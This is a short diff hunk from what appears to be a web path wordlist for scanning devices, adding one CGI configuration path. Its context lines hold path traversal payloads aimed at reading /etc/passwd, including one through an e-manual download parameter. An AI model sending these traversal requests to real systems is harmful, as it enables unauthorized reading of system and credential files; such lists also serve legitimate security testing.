@@ -4,3 +4,4 @@
 /installed_emanual_list.html
 /./../../../../../../../../../../etc/passwd
 /installed_emanual_down.html?path=/manual/../../../etc/passwd
+/cgi-bin/dynamic/config/secure/security.html
